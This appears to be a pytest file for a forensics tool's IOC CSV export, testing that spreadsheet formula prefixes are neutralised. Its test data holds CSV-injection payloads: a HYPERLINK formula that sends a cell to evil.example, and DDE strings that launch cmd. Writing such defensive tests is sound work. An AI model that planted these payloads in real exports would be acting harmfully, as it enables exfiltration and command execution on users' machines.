"""Tests for spreadsheet formula neutralisation in the IOC CSV export."""

from __future__ import annotations

import csv
import io

import pytest

from mulder.models import Finding
from mulder.report.ioc_export import build_csv, extract_classified_iocs

_HOSTILE_TITLES = [
    '=HYPERLINK("https://evil.example/?"&A2,"open")',
    "@SUM(1+1)*cmd|' /C calc'!A0",
    "+cmd|' /C calc'!A0",
    "-2+3+cmd|' /C calc'!A0",
    "\t=1+1",
    "\r=1+1",
]


def _make_finding(title: str, description: str) -> Finding:
    """Create a minimal Finding whose title becomes the IOC context."""
    return Finding(
        finding_id="f-test-001",
        case_id="test-case",
        title=title,
        description=description,
        severity="high",
        confidence="confirmed",
        evidence_refs=["tc_aabbccdd"],
        sources=["volatility.pslist"],
        mitre_attack_ids=[],
        event_time_start="2025-01-15T08:00:00Z",
        submitted_at="2025-01-15T12:00:00Z",
    )


def _rows(csv_text: str) -> list[dict[str, str]]:
    return list(csv.DictReader(io.StringIO(csv_text)))


class TestCsvFormulaNeutralisation:
    """Cells starting with formula characters are prefixed with a quote."""

    @pytest.mark.parametrize("title", _HOSTILE_TITLES)
    def test_hostile_title_is_neutralised(self, title: str) -> None:
        """A model-authored title cannot start a CSV cell with a formula prefix."""
        finding = _make_finding(title, "Beacon to 203.0.113.5 observed.")
        rows = _rows(build_csv(extract_classified_iocs([finding])))

        assert rows
        for row in rows:
            assert row["context"] == "'" + title[:80]
            assert row["context"][0] not in "=+-@\t\r"

    def test_email_value_with_formula_prefix_is_neutralised(self) -> None:
        """An email value starting with '-' or '+' is also neutralised."""
        iocs = {
            "network": [],
            "file": [],
            "email": [{"type": "Email", "value": "-2+3@evil.example", "context": "x"}],
        }
        rows = _rows(build_csv(iocs))
        assert rows[0]["value"] == "'-2+3@evil.example"

    def test_benign_cells_are_unchanged(self) -> None:
        """Ordinary titles and IOC values are written verbatim."""
        finding = _make_finding(
            "C2 beacon to external host",
            "Beacon to 203.0.113.5 from C:\\Windows\\Temp\\evil.exe, user bob@corp.example here",
        )
        rows = _rows(build_csv(extract_classified_iocs([finding])))

        assert {r["context"] for r in rows} == {"C2 beacon to external host"}
        values = {r["value"] for r in rows}
        assert "203.0.113.5" in values
        assert "C:\\Windows\\Temp\\evil.exe" in values
        assert "bob@corp.example" in values
